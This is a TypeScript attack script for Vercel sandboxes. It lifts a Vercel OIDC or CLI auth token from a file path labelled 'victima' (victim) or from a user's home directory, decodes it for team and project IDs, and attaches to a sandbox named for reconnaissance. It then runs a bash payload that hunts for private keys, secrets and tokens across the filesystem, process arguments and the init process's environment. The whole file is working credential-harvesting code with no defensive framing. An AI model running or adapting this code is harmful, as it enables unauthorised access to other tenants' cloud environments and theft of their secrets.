import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const s = await Sandbox.get({ name: "recon2-1787252249958", token: VICTIM, teamId, projectId });
  const SCRIPT = `
set +e
echo "=== buscar claves privadas / secretos en el sandbox ==="
find / -xdev -type f \( -name '*.pem' -o -name '*.key' -o -name '*secret*' -o -name '*token*' -o -name '*.pub' \) 2>/dev/null | grep -viE '/usr/lib|/usr/share|node_modules|/usr/local/go|python3' | head -30
echo "=== claves en /run, /var, /etc ==="
find /run /var /etc /opt -type f 2>/dev/null | grep -iE 'key|secret|token|cred|auth|\.pem' | head -30
echo "=== procesos con claves en argv ==="
ps -eo pid,cmd 2>/dev/null | grep -iE 'key|secret|token|pubkey|sign' | grep -v grep | head -10
echo "=== el pubkey del proceso sandbox-init (argv) ==="
tr '\\0' '\\n' < /proc/1/cmdline 2>/dev/null
echo "=== /proc/1/environ (vars del init) ==="
tr '\\0' '\\n' < /proc/1/environ 2>/dev/null | grep -iE 'key|token|secret|auth|sign|vercel' | head -20
echo "=== DONE ==="
`;
  const r = await s.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 40_000 });
  console.log(await r.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });